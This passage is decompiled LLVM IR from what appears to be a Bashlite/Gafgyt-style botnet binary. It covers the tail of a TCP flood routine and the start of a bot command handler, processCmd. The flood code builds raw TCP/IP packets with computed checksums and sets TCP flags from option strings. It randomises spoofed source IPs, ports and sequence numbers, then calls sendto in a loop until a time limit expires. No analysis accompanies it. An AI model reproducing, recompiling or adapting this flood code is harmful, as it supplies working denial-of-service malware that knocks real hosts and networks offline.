  %v3_804bf55 = load i8, i8* %v2_804c000, align 1
  %v2_804bf59 = or i8 %v3_804bf55, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf59 = zext i8 %v2_804bf59 to i32
  store i32 %v7_804bf59, i32* @edx, align 4
  store i8 %v2_804bf59, i8* %v2_804c000, align 1
  br label %dec_label_pc_804c029

dec_label_pc_804bf64:                             ; preds = %dec_label_pc_804bf19
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a3f.109 to i32), i32* @edi, align 4
  %v7_804bf94 = call i32 @_strncmp(i8* %v3_804c012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a3f.109, i32 0, i32 0), i32 4)
  %v8_804bf94 = urem i32 %v7_804bf94, 2
  %v9_804bf94 = icmp eq i32 %v8_804bf94, 0
  %v0_804bf96 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf96 = or i1 %v0_804bf96, %v9_804bf94
  %v3_804bf96 = zext i1 %v2_804bf96 to i32
  %v4_804bf96 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf96 = and i32 %v4_804bf96, -256
  %v6_804bf96 = or i32 %v3_804bf96, %v5_804bf96
  %v7_804bf96 = xor i32 %v6_804bf96, 1
  store i32 %v7_804bf96, i32* %edx.global-to-local, align 4
  %v3_804bf9c = and i32 %v7_804bf94, -256
  %v1_804bf9e = trunc i32 %v7_804bf96 to i8
  %v3_804bf9e = zext i1 %v0_804bf96 to i8
  %v4_804bf9e = sub nsw i8 %v1_804bf9e, %v3_804bf9e
  %v15_804bf9e = icmp eq i8 %v4_804bf9e, 0
  %v20_804bf9e = zext i8 %v4_804bf9e to i32
  %v23_804bf9e = or i32 %v20_804bf9e, %v3_804bf9c
  store i32 %v23_804bf9e, i32* @ecx, align 4
  %v2_804bfa2 = sext i8 %v4_804bf9e to i32
  store i32 %v2_804bfa2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bfa7 = icmp eq i1 %v15_804bf9e, false
  br i1 %v1_804bfa7, label %dec_label_pc_804bfb8, label %dec_label_pc_804bfa9

dec_label_pc_804bfa9:                             ; preds = %dec_label_pc_804bf64
  store i32 %v1_804bd8a, i32* @eax, align 4
  %v3_804bfac = load i8, i8* %v2_804c000, align 1
  %v2_804bfb0 = or i8 %v3_804bfac, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bfb0 = zext i8 %v2_804bfb0 to i32
  store i32 %v7_804bfb0, i32* @edx, align 4
  store i8 %v2_804bfb0, i8* %v2_804c000, align 1
  br label %dec_label_pc_804c029

dec_label_pc_804bfb8:                             ; preds = %dec_label_pc_804bf64
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a43.110 to i32), i32* @edi, align 4
  %v7_804bfe8 = call i32 @_strncmp(i8* %v3_804c012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a43.110, i32 0, i32 0), i32 4)
  %v8_804bfe8 = urem i32 %v7_804bfe8, 2
  %v9_804bfe8 = icmp eq i32 %v8_804bfe8, 0
  %v0_804bfea = load i1, i1* %cf.global-to-local, align 1
  %v2_804bfea = or i1 %v0_804bfea, %v9_804bfe8
  %v3_804bfea = zext i1 %v2_804bfea to i32
  %v4_804bfea = load i32, i32* %edx.global-to-local, align 4
  %v5_804bfea = and i32 %v4_804bfea, -256
  %v6_804bfea = or i32 %v3_804bfea, %v5_804bfea
  %v7_804bfea = xor i32 %v6_804bfea, 1
  store i32 %v7_804bfea, i32* %edx.global-to-local, align 4
  %v3_804bff0 = and i32 %v7_804bfe8, -256
  %v1_804bff2 = trunc i32 %v7_804bfea to i8
  %v3_804bff2 = zext i1 %v0_804bfea to i8
  %v4_804bff2 = sub nsw i8 %v1_804bff2, %v3_804bff2
  %v15_804bff2 = icmp eq i8 %v4_804bff2, 0
  %v20_804bff2 = zext i8 %v4_804bff2 to i32
  %v23_804bff2 = or i32 %v20_804bff2, %v3_804bff0
  store i32 %v23_804bff2, i32* @ecx, align 4
  %v2_804bff6 = sext i8 %v4_804bff2 to i32
  store i32 %v2_804bff6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bffb = icmp eq i1 %v15_804bff2, false
  br i1 %v1_804bffb, label %dec_label_pc_804c00c, label %dec_label_pc_804bffd

dec_label_pc_804bffd:                             ; preds = %dec_label_pc_804bfb8
  store i32 %v1_804bd8a, i32* @eax, align 4
  %v3_804c000 = load i8, i8* %v2_804c000, align 1
  %v2_804c004 = or i8 %v3_804c000, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c004 = zext i8 %v2_804c004 to i32
  store i32 %v7_804c004, i32* @edx, align 4
  store i8 %v2_804c004, i8* %v2_804c000, align 1
  br label %dec_label_pc_804c029

dec_label_pc_804c00c:                             ; preds = %dec_label_pc_804bfb8
  %v0_804c00c = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804c00c, i32* %edx.global-to-local, align 4
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  %v1_804c015 = load i32, i32* @esp, align 4
  %v2_804c015 = add i32 %v1_804c015, 8
  %v3_804c015 = inttoptr i32 %v2_804c015 to i32*
  store i32 %v4_804be8f, i32* %v3_804c015, align 4
  %v0_804c019 = load i32, i32* @esp, align 4
  %v1_804c019 = add i32 %v0_804c019, 4
  %v2_804c019 = inttoptr i32 %v1_804c019 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8056a47.111 to i32), i32* %v2_804c019, align 4
  %v0_804c021 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c021 = load i32, i32* @esp, align 4
  %v2_804c021 = inttoptr i32 %v1_804c021 to i32*
  store i32 %v0_804c021, i32* %v2_804c021, align 4
  %v3_804c024 = call i32 @Rootsprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8056a43.110 to i32))
  store i32 %v3_804c024, i32* @eax, align 4
  br label %dec_label_pc_804c029

dec_label_pc_804c029:                             ; preds = %dec_label_pc_804bffd, %dec_label_pc_804bfa9, %dec_label_pc_804bf52, %dec_label_pc_804bf07, %dec_label_pc_804bec2, %dec_label_pc_804c00c
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a43.110, i32 0, i32 0), %dec_label_pc_804c00c ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a43.110, i32 0, i32 0), %dec_label_pc_804bffd ], [ %stack_var_-156.125, %dec_label_pc_804bfa9 ], [ %stack_var_-156.125, %dec_label_pc_804bf52 ], [ %stack_var_-156.125, %dec_label_pc_804bf07 ], [ %stack_var_-156.125, %dec_label_pc_804bec2 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804c00c ], [ 4, %dec_label_pc_804bffd ], [ %stack_var_-160.126, %dec_label_pc_804bfa9 ], [ %stack_var_-160.126, %dec_label_pc_804bf52 ], [ %stack_var_-160.126, %dec_label_pc_804bf07 ], [ %stack_var_-160.126, %dec_label_pc_804bec2 ]
  %v0_804c029 = load i32, i32* @esp, align 4
  %v1_804c029 = add i32 %v0_804c029, 4
  %v2_804c029 = inttoptr i32 %v1_804c029 to i32*
  store i32 ptrtoint (i32* @global_var_8056a31.105 to i32), i32* %v2_804c029, align 4
  %v0_804c031 = load i32, i32* @esp, align 4
  %v1_804c031 = inttoptr i32 %v0_804c031 to i32*
  store i32 0, i32* %v1_804c031, align 4
  %v2_804c038 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804c038 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804c038)
  store i32 %v3_804c038, i32* %eax.global-to-local, align 4
  store i32 %v3_804c038, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c040 = icmp eq i32 %v3_804c038, 0
  %v1_804c044 = icmp eq i1 %v5_804c040, false
  %tmp92 = inttoptr i32 %v3_804c038 to i8*
  br i1 %v1_804c044, label %dec_label_pc_804be8f, label %dec_label_pc_804c04a

dec_label_pc_804c04a:                             ; preds = %dec_label_pc_804c029, %dec_label_pc_804be74, %dec_label_pc_804be33
  %v0_804c04a = phi i8* [ %v0_804c04a.pre, %dec_label_pc_804be33 ], [ %v5_804be87, %dec_label_pc_804be74 ], [ %tmp92, %dec_label_pc_804c029 ]
  %v1_804c04a = ptrtoint i8* %v0_804c04a to i32
  %v2_804c04a = call i32 @rand_cmwc(i32 %v1_804c04a)
  %v1_804c04f = urem i32 %v2_804c04a, 65536
  store i32 %v1_804c04f, i32* %edx.global-to-local, align 4
  %v1_804c055 = trunc i32 %v2_804c04a to i16
  %v3_804c055 = add i32 %v2_804bd72, 34
  %v4_804c055 = inttoptr i32 %v3_804c055 to i16*
  store i16 %v1_804c055, i16* %v4_804c055, align 2
  %v1_804c05c = add i32 %v2_804bd72, 36
  %v2_804c05c = inttoptr i32 %v1_804c05c to i16*
  store i16 0, i16* %v2_804c05c, align 4
  store i32 %v1_804bd8a, i32* %eax.global-to-local, align 4
  %v1_804c065 = add i32 %v2_804bd72, 38
  %v2_804c065 = inttoptr i32 %v1_804c065 to i16*
  store i16 0, i16* %v2_804c065, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804bc42, label %dec_label_pc_804c07e, label %dec_label_pc_804c071

dec_label_pc_804c071:                             ; preds = %dec_label_pc_804c04a
  %v0_804c071 = load i8*, i8** %stack_var_-20, align 4
  %v1_804c071 = ptrtoint i8* %v0_804c071 to i32
  %v2_804c071 = call i32 @rand_cmwc(i32 %v1_804c071)
  br label %dec_label_pc_804c092

dec_label_pc_804c07e:                             ; preds = %dec_label_pc_804c04a
  %v1_804c081 = urem i32 %arg2, 65536
  store i32 %v1_804c081, i32* %eax.global-to-local, align 4
  %v1_804c084 = load i32, i32* @esp, align 4
  %v2_804c084 = inttoptr i32 %v1_804c084 to i32*
  store i32 %v1_804c081, i32* %v2_804c084, align 4
  %v3_804c087 = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804c092

dec_label_pc_804c092:                             ; preds = %dec_label_pc_804c071, %dec_label_pc_804c07e
  %storemerge12.in = phi i32 [ %v2_804c071, %dec_label_pc_804c071 ], [ %v3_804c087, %dec_label_pc_804c07e ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804c095 = sdiv i32 %sext, 65536
  store i32 %v4_804c095, i32* @esi, align 4
  %v3_804c098 = add i32 %v2_804bd72, 22
  %v4_804c098 = inttoptr i32 %v3_804c098 to i16*
  store i16 %storemerge, i16* %v4_804c098, align 2
  %v1_804c09f = load i32, i32* @esp, align 4
  %v2_804c09f = add i32 %v1_804c09f, 4
  %v3_804c09f = inttoptr i32 %v2_804c09f to i32*
  store i32 %v1_804bd8a, i32* %v3_804c09f, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c0a6 = load i32, i32* @esp, align 4
  %v2_804c0a6 = inttoptr i32 %v1_804c0a6 to i32*
  store i32 %v2_804bd72, i32* %v2_804c0a6, align 4
  %v0_804c0a9 = call i32 @tcpcsum()
  %v1_804c0ae = urem i32 %v0_804c0a9, 65536
  store i32 %v1_804c0ae, i32* %edx.global-to-local, align 4
  %v1_804c0b4 = trunc i32 %v0_804c0a9 to i16
  store i16 %v1_804c0b4, i16* %v2_804c05c, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c0bb = or i32 %v2_804bd72, 2
  %v2_804c0bb = inttoptr i32 %v1_804c0bb to i16*
  %v3_804c0bb = load i16, i16* %v2_804c0bb, align 2
  %v4_804c0bb = zext i16 %v3_804c0bb to i32
  store i32 %v4_804c0bb, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c0c4 = load i32, i32* @esp, align 4
  %v2_804c0c4 = add i32 %v1_804c0c4, 4
  %v3_804c0c4 = inttoptr i32 %v2_804c0c4 to i32*
  store i32 %v4_804c0bb, i32* %v3_804c0c4, align 4
  %v0_804c0c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0c8 = load i32, i32* @esp, align 4
  %v2_804c0c8 = inttoptr i32 %v1_804c0c8 to i32*
  store i32 %v0_804c0c8, i32* %v2_804c0c8, align 4
  %v3_804c0cb = inttoptr i32 %v4_804c095 to i16*
  %v4_804c0cb = call i32 @csum(i16* %v3_804c0cb, i32 %v15_804bc27)
  %v1_804c0d0 = urem i32 %v4_804c0cb, 65536
  store i32 %v1_804c0d0, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c0d6 = trunc i32 %v4_804c0cb to i16
  %v3_804c0d6 = or i32 %v2_804bd72, 10
  %v4_804c0d6 = inttoptr i32 %v3_804c0d6 to i16*
  store i16 %v1_804c0d6, i16* %v4_804c0d6, align 2
  %v0_804c0da = load i32, i32* @esp, align 4
  %v1_804c0da = inttoptr i32 %v0_804c0da to i32*
  store i32 0, i32* %v1_804c0da, align 4
  %v2_804c0e1 = inttoptr i32 %v4_804c095 to i32*
  %v3_804c0e1 = call i32 @__GI_time(i32* %v2_804c0e1)
  %v5_804c0e6 = add i32 %v3_804c0e1, %arg3
  %v10_804c0e6 = icmp ult i32 %v5_804c0e6, %v3_804c0e1
  store i1 %v10_804c0e6, i1* %cf.global-to-local, align 1
  store i32 %v5_804c0e6, i32* %eax.global-to-local, align 4
  %v2_804c13d = or i32 %v2_804bd72, 12
  %v3_804c13d = inttoptr i32 %v2_804c13d to i32*
  %v3_804c14b = or i32 %v2_804bd72, 4
  %v4_804c14b = inttoptr i32 %v3_804c14b to i16*
  br label %dec_label_pc_804c0f5

dec_label_pc_804c0f5:                             ; preds = %dec_label_pc_804c1b9, %dec_label_pc_804c1d6, %dec_label_pc_804c092
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804c092 ], [ %v4_804c1d6, %dec_label_pc_804c1d6 ], [ 0, %dec_label_pc_804c1b9 ]
  store i32 %v2_804bd72, i32* %edx.global-to-local, align 4
  %v0_804c0fb = load i32, i32* @esp, align 4
  %v1_804c0fb = add i32 %v0_804c0fb, 20
  %v2_804c0fb = inttoptr i32 %v1_804c0fb to i32*
  store i32 16, i32* %v2_804c0fb, align 4
  %v1_804c103 = load i32, i32* @esp, align 4
  %v2_804c103 = add i32 %v1_804c103, 16
  %v3_804c103 = inttoptr i32 %v2_804c103 to i32*
  store i32 %v2_804bc67, i32* %v3_804c103, align 4
  %v0_804c107 = load i32, i32* @esp, align 4
  %v1_804c107 = add i32 %v0_804c107, 12
  %v2_804c107 = inttoptr i32 %v1_804c107 to i32*
  store i32 0, i32* %v2_804c107, align 4
  store i32 %v1_804bd4e, i32* @edi, align 4
  %v1_804c112 = load i32, i32* @esp, align 4
  %v2_804c112 = add i32 %v1_804c112, 8
  %v3_804c112 = inttoptr i32 %v2_804c112 to i32*
  store i32 %v1_804bd4e, i32* %v3_804c112, align 4
  %v0_804c116 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c116 = load i32, i32* @esp, align 4
  %v2_804c116 = add i32 %v1_804c116, 4
  %v3_804c116 = inttoptr i32 %v2_804c116 to i32*
  store i32 %v0_804c116, i32* %v3_804c116, align 4
  store i32 %v4_804bcaf, i32* %eax.global-to-local, align 4
  %v1_804c11d = load i32, i32* @esp, align 4
  %v2_804c11d = inttoptr i32 %v1_804c11d to i32*
  store i32 %v4_804bcaf, i32* %v2_804c11d, align 4
  %v1_804c120 = load i32, i32* %stack_var_-64, align 4
  %v2_804c120 = load i32, i32* %stack_var_-60, align 4
  %v3_804c120 = load i32, i32* %stack_var_-56, align 4
  %v4_804c120 = load i32, i32* %stack_var_-52, align 4
  %v6_804c120 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804c120, i32 %v2_804c120, i32 %v3_804c120, i32 %v4_804c120, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804c128 = load i32, i32* @esp, align 4
  %v2_804c128 = inttoptr i32 %v1_804c128 to i32*
  store i32 %storemerge10, i32* %v2_804c128, align 4
  %v1_804c12b = load i32, i32* %stack_var_-64, align 4
  %v2_804c12b = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804c12b)
  store i32 %v2_804c12b, i32* %eax.global-to-local, align 4
  %v1_804c130 = load i32, i32* @esp, align 4
  %v2_804c130 = inttoptr i32 %v1_804c130 to i32*
  store i32 %v2_804c12b, i32* %v2_804c130, align 4
  %v0_804c133 = call i32 @htonl()
  store i32 %v0_804c133, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  store i32 %v0_804c133, i32* %v3_804c13d, align 4
  %v1_804c140 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c145 = urem i32 %v1_804c140, 65536
  store i32 %v1_804c145, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c14b = trunc i32 %v1_804c140 to i16
  store i16 %v1_804c14b, i16* %v4_804c14b, align 4
  %v1_804c14f = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804c14f, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd8a, i32* %eax.global-to-local, align 4
  store i32 %v1_804c14f, i32* %v3_804bde5, align 8
  %v1_804c15c = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c161 = urem i32 %v1_804c15c, 65536
  store i32 %v1_804c161, i32* %edx.global-to-local, align 4
  %v1_804c167 = trunc i32 %v1_804c15c to i16
  store i16 %v1_804c167, i16* %v5_804bd8d, align 4
  store i16 0, i16* %v2_804c05c, align 4
  %v1_804c176 = load i32, i32* @esp, align 4
  %v2_804c176 = add i32 %v1_804c176, 4
  %v3_804c176 = inttoptr i32 %v2_804c176 to i32*
  store i32 %v1_804bd8a, i32* %v3_804c176, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c17d = load i32, i32* @esp, align 4
  %v2_804c17d = inttoptr i32 %v1_804c17d to i32*
  store i32 %v2_804bd72, i32* %v2_804c17d, align 4
  %v0_804c180 = call i32 @tcpcsum()
  %v1_804c185 = urem i32 %v0_804c180, 65536
  store i32 %v1_804c185, i32* %edx.global-to-local, align 4
  %v1_804c18b = trunc i32 %v0_804c180 to i16
  store i16 %v1_804c18b, i16* %v2_804c05c, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v3_804c192 = load i16, i16* %v2_804c0bb, align 2
  %v4_804c192 = zext i16 %v3_804c192 to i32
  store i32 %v4_804c192, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804c19b = load i32, i32* @esp, align 4
  %v2_804c19b = add i32 %v1_804c19b, 4
  %v3_804c19b = inttoptr i32 %v2_804c19b to i32*
  store i32 %v4_804c192, i32* %v3_804c19b, align 4
  %v0_804c19f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c19f = load i32, i32* @esp, align 4
  %v2_804c19f = inttoptr i32 %v1_804c19f to i32*
  store i32 %v0_804c19f, i32* %v2_804c19f, align 4
  %v1_804c1a2 = load i32, i32* %stack_var_-64, align 4
  %v2_804c1a2 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804c1a2 = call i32 @csum(i16* %v2_804c1a2, i32 %v1_804c1a2)
  %v1_804c1a7 = urem i32 %v3_804c1a2, 65536
  store i32 %v1_804c1a7, i32* %edx.global-to-local, align 4
  %v1_804c1ad = trunc i32 %v3_804c1a2 to i16
  store i16 %v1_804c1ad, i16* %v4_804c0d6, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804c1b4 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804c1b4, i1* %cf.global-to-local, align 1
  %v15_804c1b4 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804c1b7 = icmp eq i1 %v15_804c1b4, false
  br i1 %v1_804c1b7, label %dec_label_pc_804c1d6, label %dec_label_pc_804c1b9

dec_label_pc_804c1b9:                             ; preds = %dec_label_pc_804c0f5
  %v0_804c1b9 = load i32, i32* @esp, align 4
  %v1_804c1b9 = inttoptr i32 %v0_804c1b9 to i32*
  store i32 0, i32* %v1_804c1b9, align 4
  %v1_804c1c0 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804c1c0 = call i32 @__GI_time(i32* %v1_804c1c0)
  store i32 %v2_804c1c0, i32* %eax.global-to-local, align 4
  %v10_804c1c5 = icmp ult i32 %v2_804c1c0, %v5_804c0e6
  store i1 %v10_804c1c5, i1* %cf.global-to-local, align 1
  %v8_804c1c8 = icmp sgt i32 %v2_804c1c0, %v5_804c0e6
  br i1 %v8_804c1c8, label %dec_label_pc_804c1de, label %dec_label_pc_804c0f5

dec_label_pc_804c1d6:                             ; preds = %dec_label_pc_804c0f5
  %v4_804c1d6 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804c0f5

dec_label_pc_804c1de:                             ; preds = %dec_label_pc_804c1b9, %dec_label_pc_804bc67, %dec_label_pc_804bd0c, %dec_label_pc_804bcbd
  %v0_804c1e8 = phi i32 [ %v4_804bc77, %dec_label_pc_804bc67 ], [ %v3_804bd1c, %dec_label_pc_804bd0c ], [ %v3_804bccd, %dec_label_pc_804bcbd ], [ %v2_804c1c0, %dec_label_pc_804c1b9 ]
  store i32 %v0_804bc26, i32* @ebx, align 4
  store i32 %v0_804bc25, i32* @esi, align 4
  ret i32 %v0_804c1e8

; uselistorder directives
  uselistorder i32 %v3_804c1a2, { 1, 0 }
  uselistorder i32 %v0_804c180, { 1, 0 }
  uselistorder i32 %v1_804c15c, { 1, 0 }
  uselistorder i32 %v1_804c140, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804c0e6, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804c0e1, { 1, 0 }
  uselistorder i32 %v4_804c0cb, { 1, 0 }
  uselistorder i32 %v0_804c0a9, { 1, 0 }
  uselistorder i32 %v4_804c095, { 2, 1, 0 }
  uselistorder i32 %v1_804c081, { 1, 0 }
  uselistorder i32 %v2_804c04a, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804bfea, { 1, 0 }
  uselistorder i32 %v7_804bfe8, { 1, 0 }
  uselistorder i1 %v0_804bf96, { 1, 0 }
  uselistorder i32 %v7_804bf94, { 1, 0 }
  uselistorder i1 %v0_804bf3f, { 1, 0 }
  uselistorder i32 %v7_804bf3d, { 1, 0 }
  uselistorder i1 %v0_804bef4, { 1, 0 }
  uselistorder i32 %v7_804bef2, { 1, 0 }
  uselistorder i1 %v0_804beaf, { 1, 0 }
  uselistorder i32 %v7_804bead, { 1, 0 }
  uselistorder i32 %v4_804be8f, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804c012, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804c000, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804be36, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804be20, { 1, 0 }
  uselistorder i32 %v7_804be1e, { 1, 0 }
  uselistorder i32 %v2_804bdcd, { 1, 0 }
  uselistorder i32 %v1_804bd8a, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804bd72, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804bd4e, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804bd44, { 1, 0 }
  uselistorder i32 %v4_804bcaf, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804bc55, { 1, 0 }
  uselistorder i32 %v15_804bc27, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 53, 54, 56, 55, 58, 57, 59, 60 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c1de, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804c0f5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c092, { 1, 0 }
  uselistorder label %dec_label_pc_804c029, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804be8f, { 1, 0 }
  uselistorder label %dec_label_pc_804bd4b, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804bc67, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp119 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804c1ec = load i32, i32* @edi, align 4
  %v0_804c1ed = load i32, i32* @esi, align 4
  %v0_804c1ee = load i32, i32* @ebx, align 4
  store i32 %v0_804c1ee, i32* %stack_var_-16, align 4
  %v5_804c1ef = icmp ult i32* %stack_var_-16, inttoptr (i32 300 to i32*)
  store i1 %v5_804c1ef, i1* %cf.global-to-local, align 1
  %v2_804c1f8 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c215 = inttoptr i32 %v2_804c1f8 to i8*
  store i32 %v2_804c1f8, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80566e0.19 to i32), i32* @edi, align 4
  %v7_804c227 = call i32 @_strncmp(i8* %v4_804c215, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80566e0.19, i32 0, i32 0), i32 5)
  %v8_804c227 = urem i32 %v7_804c227, 2
  %v9_804c227 = icmp eq i32 %v8_804c227, 0
  %v0_804c229 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c229 = or i1 %v0_804c229, %v9_804c227
  %v3_804c229 = zext i1 %v2_804c229 to i32
  %v4_804c229 = load i32, i32* @edx, align 4
  %v5_804c229 = and i32 %v4_804c229, -256
  %v6_804c229 = or i32 %v3_804c229, %v5_804c229
  %v7_804c229 = xor i32 %v6_804c229, 1
  store i32 %v7_804c229, i32* %edx.global-to-local, align 4
  %v1_804c231 = trunc i32 %v7_804c229 to i8
  %v3_804c231 = zext i1 %v0_804c229 to i8
  %v15_804c231 = icmp eq i8 %v1_804c231, %v3_804c231
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c23a = icmp eq i1 %v15_804c231, false
  br i1 %v1_804c23a, label %dec_label_pc_804c256, label %dec_label_pc_804c23c

dec_label_pc_804c23c:                             ; preds = %entry
  %v0_804c23c = load i32, i32* @global_var_805a6e0.18, align 32
  %v2_804c24c = call i32 @Rootsprintf(i32 %v0_804c23c, i32 ptrtoint ([6 x i8]* @global_var_8056a59.112 to i32))
  br label %dec_label_pc_804cd5c

dec_label_pc_804c256:                             ; preds = %entry
